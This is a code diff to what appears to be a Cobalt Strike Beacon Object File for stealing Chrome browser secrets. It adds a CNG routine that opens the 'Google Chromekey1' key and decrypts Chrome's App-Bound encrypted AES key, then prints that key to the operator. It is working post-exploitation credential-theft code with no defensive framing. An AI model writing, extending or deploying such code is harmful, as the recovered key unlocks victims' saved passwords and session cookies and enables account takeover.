@@ -67,6 +67,11 @@ DECLSPEC_IMPORT HRESULT WINAPI OLE32$CoCreateInstance (REFCLSID rclsid, LPUNKNOW
 DECLSPEC_IMPORT	HRESULT WINAPI OLE32$CoSetProxyBlanket(IUnknown* pProxy, DWORD dwAuthnSvc, DWORD dwAuthzSvc, OLECHAR* pServerPrincName, DWORD dwAuthnLevel, DWORD dwImpLevel, RPC_AUTH_IDENTITY_HANDLE pAuthInfo, DWORD dwCapabilities);
 WINBASEAPI void __cdecl MSVCRT$free(void *_Memory);
 WINBASEAPI void* WINAPI MSVCRT$malloc(SIZE_T);
+DECLSPEC_IMPORT SECURITY_STATUS WINAPI NCRYPT$NCryptFreeObject (NCRYPT_HANDLE hObject);
+DECLSPEC_IMPORT SECURITY_STATUS WINAPI NCRYPT$NCryptDecrypt (NCRYPT_KEY_HANDLE hKey, PBYTE pbInput, DWORD cbInput, VOID *pPaddingInfo, PBYTE pbOutput, DWORD cbOutput, DWORD *pcbResult, DWORD dwFlags);
+DECLSPEC_IMPORT SECURITY_STATUS WINAPI NCRYPT$NCryptOpenKey (NCRYPT_PROV_HANDLE hProvider, NCRYPT_KEY_HANDLE *phKey, LPCWSTR pszKeyName, DWORD dwLegacyKeySpec, DWORD dwFlags);
+DECLSPEC_IMPORT SECURITY_STATUS WINAPI NCRYPT$NCryptOpenStorageProvider (NCRYPT_PROV_HANDLE *phProvider, LPCWSTR pszProviderName, DWORD dwFlags);
+
 #define IMPORT_RESOLVE FARPROC SHGetFolderPath = Resolver("shell32", "SHGetFolderPathA"); \
     FARPROC PathAppend = Resolver("shlwapi", "PathAppendA"); \
     FARPROC srand = Resolver("msvcrt", "srand");\
@@ -935,6 +940,90 @@ BOOL PopDWORDFromStringFront(BYTE** data, DWORD* data_len, DWORD* output) {
     return TRUE;
 }
 
+BYTE* decrypt_with_cng(const BYTE* input_data, DWORD input_size, DWORD* output_size) {
+    NCRYPT_PROV_HANDLE hProvider = 0;
+    NCRYPT_KEY_HANDLE hKey = 0;
+    BYTE* output_buffer = NULL;
+    DWORD buffer_size = 0;
+    SECURITY_STATUS status;
+    
+    // Initialize output size
+    *output_size = 0;
+    
+    // Open storage provider
+    LPCWSTR provider_name = L"Microsoft Software Key Storage Provider";
+    status = NCRYPT$NCryptOpenStorageProvider(&hProvider, provider_name, 0);
+    if (status != ERROR_SUCCESS) {
+        BeaconPrintf(CALLBACK_ERROR,"NCryptOpenStorageProvider failed with status 0x%08X\n", status);
+        return NULL;
+    }
+    
+    // Open key
+    LPCWSTR key_name = L"Google Chromekey1";
+    status = NCRYPT$NCryptOpenKey(hProvider, &hKey, key_name, 0, 0);
+    if (status != ERROR_SUCCESS) {
+        BeaconPrintf(CALLBACK_ERROR,"NCryptOpenKey failed with status 0x%08X\n", status);
+        NCRYPT$NCryptFreeObject(hProvider);
+        return NULL;
+    }
+    
+    // First call to get required buffer size
+    status = NCRYPT$NCryptDecrypt(
+        hKey,
+        (PBYTE)input_data,
+        input_size,
+        NULL,                    // pPaddingInfo
+        NULL,                    // pbOutput (NULL to get size)
+        0,                       // cbOutput
+        &buffer_size,            // pcbResult
+        NCRYPT_SILENT_FLAG       // dwFlags (0x40)
+    );
+    
+    if (status != ERROR_SUCCESS) {
+        BeaconPrintf(CALLBACK_ERROR,"1st NCryptDecrypt failed with status 0x%08X\n", status);
+        NCRYPT$NCryptFreeObject(hKey);
+        NCRYPT$NCryptFreeObject(hProvider);
+        return NULL;
+    }
+    
+    // Allocate output buffer
+    output_buffer = (BYTE*)MSVCRT$malloc(buffer_size);
+    if (!output_buffer) {
+        BeaconPrintf(CALLBACK_ERROR,"Memory allocation failed\n");
+        NCRYPT$NCryptFreeObject(hKey);
+        NCRYPT$NCryptFreeObject(hProvider);
+        return NULL;
+    }
+    
+    // Second call to actually decrypt
+    status = NCRYPT$NCryptDecrypt(
+        hKey,
+        (PBYTE)input_data,
+        input_size,
+        NULL,                    // pPaddingInfo
+        output_buffer,           // pbOutput
+        buffer_size,             // cbOutput
+        &buffer_size,            // pcbResult (actual bytes written)
+        NCRYPT_SILENT_FLAG       // dwFlags (0x40)
+    );
+    
+    if (status != ERROR_SUCCESS) {
+        BeaconPrintf(CALLBACK_ERROR,"2nd NCryptDecrypt failed with status 0x%08X\n", status);
+        MSVCRT$free(output_buffer);
+        output_buffer = NULL;
+        buffer_size = 0;
+    }
+    
+    // Clean up
+    NCRYPT$NCryptFreeObject(hKey);
+    NCRYPT$NCryptFreeObject(hProvider);
+    
+    // Set output size
+    *output_size = buffer_size;
+    
+    return output_buffer;
+}
+
 BOOL AppBoundDecryptor(char * localStateFile, int pid){
     IMPORT_RESOLVE;
 
@@ -1130,14 +1219,39 @@ BOOL AppBoundDecryptor(char * localStateFile, int pid){
     // Get key blob
     BYTE* key_blob = cursor;
     
-    BeaconPrintf(CALLBACK_OUTPUT,"Decrypted Key (%lu bytes):\n", key_len);
-    CHAR *output = (CHAR*)KERNEL32$GlobalAlloc(GPTR, (key_len * 4) + 1);
+        // if first byte is 03 then decyrpt with CNG
+        if (key_blob[0] == 0x03) {
+            BeaconPrintf(CALLBACK_OUTPUT,"Decrypting key with CNG...");
+            BYTE* aes_encrypted_key = key_blob + 1;  // skip flag
+            DWORD cng_out_len = 0;
+            BYTE *decrypted = decrypt_with_cng(aes_encrypted_key, 32, &cng_out_len);
+            if (decrypted) {
+                CHAR *chromeOutput = (CHAR*)KERNEL32$GlobalAlloc(GPTR, (key_len * 4) + 1);
+                BeaconPrintf(CALLBACK_OUTPUT,"CNG Decryption Output (%lu bytes):\n", cng_out_len);
+                
+                for (DWORD i = 0; i < cng_out_len; i++) {
+                    MSVCRT$sprintf(chromeOutput, "%s\\x%02x", chromeOutput, decrypted[i]);
+                }
+                
+                BeaconPrintf(CALLBACK_OUTPUT,"Chrome AES Key: %s \n", chromeOutput );
     
-    for (DWORD i = 0; i < key_len; i++) {
-        MSVCRT$sprintf(output, "%s\\x%02x", output, key_blob[i]);
-        
-    }
-    BeaconPrintf(CALLBACK_OUTPUT,"Decrypt Key: %s \n", output );
+                MSVCRT$free(decrypted);
+                KERNEL32$GlobalFree(chromeOutput);
+    
+            } else {
+                BeaconPrintf(CALLBACK_ERROR,"CNG decryption failed.\n");
+            }
+    
+        }
+        BeaconPrintf(CALLBACK_OUTPUT,"Decrypted Key (%lu bytes):\n", key_len);
+        CHAR *output = (CHAR*)KERNEL32$GlobalAlloc(GPTR, (key_len * 4) + 1);
+       
+        for (DWORD i = 0; i < key_len; i++) {
+            MSVCRT$sprintf(output, "%s\\x%02x", output, key_blob[i]);
+        }
+         
+        BeaconPrintf(CALLBACK_OUTPUT,"Decrypt Key: %s \n", output );
+    
     
     // Clean up
     KERNEL32$LocalFree(decrypted_blob.pbData);
